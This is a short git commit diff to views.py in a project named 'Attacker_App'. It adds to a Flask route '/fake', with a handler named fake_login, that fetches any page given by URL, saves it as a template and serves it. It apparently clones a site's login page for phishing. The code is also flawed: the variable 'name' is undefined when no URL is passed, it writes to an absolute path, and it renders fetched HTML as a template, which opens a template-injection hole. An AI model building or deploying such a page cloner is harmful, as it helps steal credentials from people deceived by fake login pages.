a09abbc7bac46c0ae6b5d7252f90c46a7c3de15c
root <root@localhost.localdomain>
2017-05-03 17:11:04 -0400

    modified views

--- Attacker_App/app/views.py
+++ Attacker_App/app/views.py
@@ -1,10 +1,18 @@
 from app import app
 from flask import render_template, request
+import sys 
+import requests
+
 
 @app.route('/fake')
 def fake_login():
 	if request.args.get("url"):
 		url = request.args.get("url")
-
-	return render_template("index.html")
-
+		r = requests.get(url)
+		hstring = str(r.text)
+		name = "fake.html"
+		print(hstring)
+		with open("/templates/"+name, 'w') as out:
+			out.write(hstring)
+	
+	return render_template(name)
